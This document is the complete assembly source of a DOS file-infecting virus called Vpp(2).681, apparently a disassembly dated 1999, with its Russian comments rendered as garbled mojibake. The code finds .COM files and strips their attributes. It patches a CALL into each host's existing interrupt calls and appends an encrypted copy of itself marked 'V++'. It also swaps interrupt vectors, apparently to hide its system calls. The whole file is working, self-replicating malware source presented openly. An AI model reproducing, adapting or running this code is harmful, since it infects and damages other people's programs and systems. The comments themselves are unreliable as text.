   ;‚¨àãá Vpp(2).681 ¤¨§ áá¥¬¡«¨à®¢  08.07.1999 (c) CrkV

   ;*ã ¢®â ¢¨¤®, çâ® ¬®¨ ª®¬¬¥â à¨¨ ¥ ¯à®¯ «¨ ¤ à®¬ ;-)))

   ;’®«ìª® ¨®£¤  ¯®«¥§® ¨ ¢ ®â« ¤ç¨ª § £«ïãâì,   â® ã ¬¥ï
   ;á«®¦¨«®áì â ª®¥ ¬¥¨¥, çâ® âë ¥£®   áª®àãî àãªã ¯¥à¥¤¥« «,
   ;¯à¨ íâ®¬ ¥ ã¤®áã¦¨«áï ¨ â®«ª®¬ ¥£® ¯à®¢¥à¨âì :-(((


   DOSInt  EQU 20h

   Int21h  EQU Int DOSInt

   ;ï ¢á¥£¤  ¯à¥¤¯®ç¨â î Int 3 ¨ ¬¥áâ® íª®®¬¨¬ ¨ £«ã¯ëå « ¬¥à®¢ ®â¯ã£¥¬

   .model tiny
   .code
   .286
       Org 100h
   Vpp2:
       Push    103h
       PushA
       PushF
       Push    Ds
       Push    Es
       Push    103h
       Mov Bp,Offset Entry_Point
       Jmp @Start

   Entry_Point:
       Push    Bp
       Push    Si
       Mov Si,Sp
       Mov Bp,Ss:[Si+04h]
       Sub Bp,03h          ;¯®«ãç¨âì  ¤à¥á ¢®§¢à â 
       Mov Ss:[Si+04h],Bp
           Mov     Ds:[04h],Bp     ;Warning -   çâ® §   ¤à¥á ???
       Pop Si          ;¨ ¢®®¡é¥ á¬. Vp, â ¬ ¢á¥ ¯à®é¥ ;))
       Pop Bp
       PushA               ;á®åà ¨¬ ¢á¥ à¥£¨áâàë
       PushF               ;ä« £¨ â®¦¥ c®åà ¨¬
       Push    Ds
       Push    Es
       Push    Cs
       Pop Ds
       Push    Cs
       Pop Es

   ;áâ¥ª ï ¡ë â®¦¥ ¯¥à¥ª«îç¨«, ª®¥ç® ¢®¯à®á á¯®àë© çâ®  ¤¥¦¥¥,
   ;® â ª å®âì ¯à¥ä¨ªáë ¯¥à¥¤ [Bp] ¥  ¤® áâ ¢¨âì.

       Mov Bp,Ds:[04h]     ;Warning - Ds ¬®£«® ¯®¬¥ïâìáï !!!
       Push    Bp
       Call    $ + 3
   My_Point:
       Pop Bp                      ;Bp:=Offset My_Point
       Sub Bp,Offset My_Point - Offset Entry_Point
       Lea Si,[Bp+Part2]       ; ¤à¥á à áè¨äà®¢ª¨
       Mov Di,Si
       Mov Bx,0C6C6h

       Org $ - 2
   Word_Shifr  EQU $ - Offset Entry_Point
       dw  0C6C6h

       Mov Cx,Shifr_Lenght     ;Opti-Mov Cx,266 Shr 1
       Shr Cx,1

   @LShifr:
       LodSW
       Not Ax
       Xor Ax,Bx
       Not Ax
       StoSW
       Loop    @LShifr

   Part2   EQU $ - Offset Entry_Point
   @Start:
       Sub Cx,Cx           ;Opti - ¢ëª¨ãâì (loop)
       Mov Ds,Cx           ;â ¡«¨æ  ¯à¥àë¢ ¨©
       Call    Set_Int21h      ;Int 20h <-> Int 21h
       Push    Cs
       Pop Ds
       Mov Ah,Ds:[Bp+Func2Fh]  ;Get DTA
       Int21h
       Lea Si,[Bp+Save_DTA]
       Mov [Si],Es         ;OPTI-¯®¬¥ïâì ¬¥áâ ¬¨ (¤«ï LDs)
       Mov [Si+2],Bx
       Push    Cs
       Pop Es
       Mov Ah,Ds:[Bp+Func1Ah]  ;Set DTA
       Lea Dx,[Bp+New_DTA]
       Int21h              ;ãáâ  ¢«¨¢ ¥¬ á¢®î DTA
       Jmp @Restore_Byte

   @Ok_Restore:
       Mov Ah,Ds:[Bp+Func4Eh]  ;Find_First
       Mov Cl,Ds:[Bp+AtrF]
       Lea Dx,[Bp+Mask_Com]

   @Find_File:
       Int21h
       Jc  @Exit
       Jmp @Check_File

   @Exit:
       Mov Ah,Ds:[Bp+Func1Ah]  ;Set DTA
       Mov Dx,Ds:[Bp+Save_DTA]
       Mov Dx,Dx           ;Warning-®¯¨áª  ( ¤® Mov Ds,Dx)
       Mov Dx,Ds:[Bp+Save_DTA][2]
       Int21h              ;‚®ááâ  ¢«¨¢ ¥¬ ¯à®£à ¬¬ãî DTA
       Sub Cx,Cx
       Mov Ds,Cx
       Call    Set_Int21h      ;¬¥ï¥¬ ®¡à â® Int 20h <-> Int 21h
       Pop Es
       Pop Ds
       PopF
       PopA                ;‚®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
       Pop Bp
       Sub Bp,3            ;Warning - ’€Œ “†… €„*…‘ ‚Ž‡‚*€’€
       Push    Bp
       Ret             ;‚ëå®¤¨¬ ¨§ ¢¨àãá 
   ;---------------------------------------
   @Check_File:
       Lea Dx,[Bp+New_DTA+1Eh] ; ©¤¥®¥ ¨¬ï ¢ DTA
       Mov Ax,Ds:[Bp+Func4301h]    ;Set Atr
       Xor Cx,Cx
       Int21h
       Jc  @Not_Infected

       Lea Dx,[Bp+New_DTA+1Eh] ;Opti - ¢ëª¨ãâì
       Mov Ax,Ds:[Bp+Func3D02h]    ;Open File (rd/wr)
       Int21h
       Jc  @Not_Infected
       Xchg    Bx,Ax           ;Bx:=Ax (File Handle)
       Mov Ax,Ds:[Bp+Func4202h]    ;LSeek File
       Mov Cx,Ds:[Bp+_0000h]
       Mov Dx,Cx           ;OPTI-Cwd
       Int21h              ;  ¢ëå®¤¥ Dx:Ax - à §¬¥à ä ©« 
       Cmp Dx,00h          ;OPTI-Or Dx,Dx
       Jne @Not_Infected
       Cmp Ax,0400h
       Jle @Not_Infected       ;ä ©« ¬ «®¢ â
       Cmp Ax,0F000h
       Jnb @Not_Infected       ;  ¢®â íâ®â ¢¥«¨ª ;-))

       Lea Si,[Bp+Save_Ofs]
       Mov [Si],Ax
       Sub Ax,03h
       Xchg    Dx,Ax

       Mov Ax,Ds:[Bp+Func4200h]    ;Lseek File
       Mov Cx,Ds:[Bp+_0000h]
       Int21h              ;ãáâ  ¢«¨¢ ¥¬ ãª.   ª®¥æ ä ©«  - 3

       Mov Ah,Ds:[Bp+Func3Fh]  ;Read File
       Lea Dx,[Bp+Save_Byte]
       Mov Cx,Ds:[Bp+_0003h]
       Int21h              ;‘ç¨â ¥¬ 3 ¡ ©â 
       Mov Ax,Ds:[Bp+Save_Byte]
       Cmp Ax,'+V'         ;V+ - ¬¥âª  ¢¨àãá 
       Je  @Not_Infected       ;¢®§¬®¦® § à ¦¥
       Mov Ax,Ds:[Bp+Func4200h]    ;Lseek File
       Mov Cx,Ds:[Bp+_0000h]
       Mov Dx,Cx           ;OPTI-Cwd
       Int21h              ;ãáâ  ¢«¨¢ ¥¬ ãª.    ç «® ä ©« 

       Call    Infect

   @Not_Infected:
       Mov Ah,Ds:[Bp+Func3Eh]  ;Close File
       Int21h
       Mov Ax,Ds:[Bp+Func4301h]    ;Set Atr
       Lea Dx,[Bp+New_DTA+1Eh]
       Mov Cx,Ds:[Bp+_0000h]
       Mov Cl,Ds:[Bp+New_DTA+15h]  ; âà¨¡ãâë ¨§ DTA
       Int21h
   ;¢®®¡é¥-â® ¨ ¢à¥¬ï ¥ ¬¥è «® ¢®ááâ ®¢¨âì ;-))

   @Exit_Check:
       Mov Ah,Ds:[Bp+Func4Fh]  ;Find Next
       Jmp @Find_File
   ;---------------------------------------
   Scan    Proc
       Push    Ax
       Push    Bx
       Push    Cx
       Push    Dx
       Cld                             ;OPTI-¢ëª¨ãâì
       Mov Al,[Si]         ;0CDh

   @Next_Scan:
       Repne   ScaSB
       Jz  @Ok_Scan
       Mov Di,0FFFFh
       Jmp @Exit_Scan

   @Ok_Scan:
       Push    Cx
       Push    Di
       Push    Si
       Mov Cx,Bx
       Dec Di
       Rep CmpSB
       Je  @Find_Scan
       Pop Si
       Pop Di
       Pop Cx
       Jmp @Next_Scan

   @Find_Scan:
       Pop Si
       Pop Di
       Dec Di
       Pop Cx

   @Exit_Scan:
       Pop Dx
       Pop Cx
       Pop Bx
       Pop Ax
       Ret
   Scan    EndP
   ;---------------------------------------
   Cont_Infect Proc
       Mov Ax,Ds:[Bp+Func4200h]    ;Lseek File
       Mov Cx,Ds:[Bp+_0000h]
       Mov Dx,Di           ;âãâ ¡ã¤¥â ¯¥à¥å®¤   â¥«® ¢¨àãá 
       Int21h
       Lea Si,[Bp+Save_Ofs]
       Mov Ax,[Si]
       Sub Ax,Di
       Sub Ax,3            ;¢ëç¨á«ï¥¬ á¬¥é¥¨¥ ¤«ï Call ¢¨àãá
       Lea Si,[Bp+Save_Byte]
       Mov Byte Ptr [Si],0E8h  ;Call Entry_Point
       Mov [Si+01h],Ax
       Xchg    Si,Dx           ;Dx:=Si
       Mov Ah,Ds:[Bp+Func40h]  ;Write File ***1
       Mov Cx,Ds:[Bp+_0003h]
       Int21h          ;‡ ¯¨á «¨ ª®¬ ¤ã ¯¥à¥å®¤ 
       Mov Ax,Ds:[Bp+Func4202h]    ;Lseek File
       Mov Cx,Ds:[Bp+_0000h]
       Mov Dx,Cx
       Int21h              ;ãè«¨   ª®¥æ ä ©« 
       Lea Si,[Bp+Buffer]      ;***2
       Add Si,Di
       Lea Di,[Bp+Save_Byte]
       Mov Cx,Ds:[Bp+_0003h]   ;OPTI-«ãçè¥ MovSW, MovSB
       Rep MovSB
       Lea Dx,[Bp+Buffer]      ;OPTI-***1 Push Si,Pop Dx
       Call    Shifr
       Mov Cx,Vir_Lenght
       Mov Ah,Ds:[Bp+Func40h]  ;Write_File (OPTI ***2 Push Ax,Pop Ax)
       Int21h              ;„®¯¨á «¨ ¢¨àãá
       Ret
   Cont_Infect EndP
   ;---------------------------------------
   Set_Int21h  Proc
       Cli
       Mov Bx,Ds:[DOSInt*4]    ;Int 20h
       Mov Cx,Ds:[21h*4]       ;Int 21h
       Xchg    Bx,Cx
       Mov Ds:[DOSInt*4],Bx    ;Opti-Mov R,M; Xchg R,M; Mov M,R
       Mov Ds:[21h*4],Cx
       Mov Bx,Ds:[DOSInt*4][2] ;Int 20h
       Mov Cx,Ds:[21h*4][2]    ;Int 21h
       Xchg    Bx,Cx
       Mov Ds:[DOSInt*4][2],Bx ;Opti-Mov R,M; Xchg R,M; Mov M,R
       Mov Ds:[21h*4][2],Cx
       Sti
       Ret
   Set_Int21h  EndP
   ;---------------------------------------
   @Restore_Byte:
       ClD
       Pop Di          ; ¤à¥á ¢®§¢à â 
       Lea Si,[Bp+Save_Byte]
       Mov Cx,3            ;OPTI-ï ¦¥ ¯¨á «, íâ® «¨è¥¥
       MovSB
       MovSW
       Jmp @Ok_Restore
   ;---------------------------------------
   Infect  Proc
       PushA
       Lea Dx,[Bp+Buffer]
       Push    Dx
       Mov Ah,Ds:[Bp+Func3Fh]  ;Read File
       Mov Cx,400h
       Push    Cx
       Int21h              ;áç¨âë¢ ¥¬ 1024 ¡ ©â 
       Pop Cx
       Lea Si,[Bp+_Int10h]
       Pop Di
       Push    Bx
       Mov Bx,2
       Call    Scan
       Pop Bx

   ;   Cmp Di,0FFFFh       ;OPTI-Inc Di
       Cmp Di,1234h        ;Tasm âãâ  ®¯â¨¬¨§¨àã¥â ;-))
       Org $ - 2           ;¤«ï á®¢¬¥áâ¨¬®áâ¨ ª®¤ 
       dw  0FFFFh
       Je  @Scan_CD21h     ;¥  è«¨ ¯®¨é¥¬ 21CDh
   @Infect21:
       Sub Di,Buffer
       Sub Di,Bp
       Call    Cont_Infect     ;*®¥¤¥¬ § à ¦ âì

   @Exit_Infect:
       PopA
       Ret

   @Scan_CD21h:
       Lea Di,[Bp+Buffer]
       Lea Si,[Bp+_Int21h]
       Push    Bx
       Mov Bx,02h          ;OPTI-Mov Bl,02h
       Call    Scan
       Pop Bx

   ;   Cmp Di,0FFFFh       ;OPTI-Inc Di
       Cmp Di,1234h        ;Tasm âãâ  ®¯â¨¬¨§¨àã¥â ;-))
       Org $ - 2           ;¤«ï á®¢¬¥áâ¨¬®áâ¨ ª®¤ 
       dw  0FFFFh

       Je  @Exit_Infect        ;’ãâ ¥â ¨ 21CDh, ¯à¨¤¥âáï ®â¢ «¨âì
       Jmp @Infect21       ;*®¥¤¥¬ § à ¦ âì

   ;OPTI - ¨ ¢®®¡é¥ íâ®â ªãá®ª ¨¤¥â¨ç¥ ¯®¨áªã 10CDh

   Infect  EndP
   ;---------------------------------------
   Random  Proc
       Mov Al,Ah
       In  Al,40h
       Cmp Al,Ah
       Jnb Random
       Xchg    Ah,Al
       Ret
   Random  EndP
   ;---------------------------------------
   Shifr   Proc
       Push    Ax
       Push    Bx
       Push    Cx
       Push    Dx
       Mov Di,Dx           ;Buffer
       Mov Si,Bp           ; ç «® ¢¨àãá 
       Mov Cx,Part2
       Mov Ah,0FFh
       Call    Random
       Xchg    Bx,Ax
       Mov Bl,Bh
       Mov Ds:[Bp+Word_Shifr],Bx   ;Opti-[Si]
       Repe    MovSB
       Mov Cx,Shifr_Lenght     ;Opti-Mov Cx,266 Shr 1
       Shr Cx,1

   @LShifr2:
       LodSW
       Not Ax
       Xor Ax,Bx
       Not Ax
       StoSW
       Loop    @LShifr2        ;§ è¨äà®¢ë¢ ¥¬ ®á®¢®¥ â¥«® ¢¨àãá 

       Mov Ax,'+V'         ;¬¥âª  ¢¨àãá 
       StoSW
       Mov Al,'+'
       StoSB

       Pop Dx
       Pop Cx
       Pop Bx
       Pop Ax
       Ret
   Shifr   EndP
   ;----------------------------------------
   ;”ãªæ¨¨ ¨ ª®áâ âë ¢¨àãá 
   Func40h     EQU $ - Offset Entry_Point
       db  40h
   Func4202h   EQU $ - Offset Entry_Point
       dw  4202h
   Func3Eh     EQU $ - Offset Entry_Point
       db  3Eh
   Func3D02h   EQU $ - Offset Entry_Point
       dw  3D02h
   Func4Fh     EQU $ - Offset Entry_Point
       db  4Fh
   Func4301h   EQU $ - Offset Entry_Point
       dw  4301h
   Func3Fh     EQU $ - Offset Entry_Point
       db  3Fh
   Func4200h   EQU $ - Offset Entry_Point
       dw  4200h
   _0003h      EQU $ - Offset Entry_Point
       dw  0003h
   AtrF        EQU $ - Offset Entry_Point
       db  0FEh
   Func4Eh     EQU $ - Offset Entry_Point
       db  4Eh
   Mask_Com    EQU $ - Offset Entry_Point
       db  '*.com'
   _0000h      EQU $ - Offset Entry_Point
       dw  0000h
   Func2Fh     EQU $ - Offset Entry_Point
       db  02Fh
   Func1Ah     EQU $ - Offset Entry_Point
       db  1Ah
   _Int10h     EQU $ - Offset Entry_Point
       Int 10h
   _Int21h     EQU $ - Offset Entry_Point
       Int 21h
   Save_Byte   EQU $ - Offset Entry_Point
       db  0CDh,20h,20h

   Shifr_Lenght    EQU $ - Offset Part2 - Entry_Point

   StrVpp  db  'V++'
   Vir_Lenght  EQU $ - Offset Entry_Point
   ;---------------------------------------
   Save_Ofs    EQU $ - Offset Entry_Point
       dw  ?
   Save_DTA    EQU $ - Offset Entry_Point
       dw  2   Dup (?)
   Buffer      EQU $ - Offset Entry_Point
       db  400h    Dup (?)
   New_DTA     EQU $ - Offset Entry_Point
   ;---------------------------------------
       End Vpp2
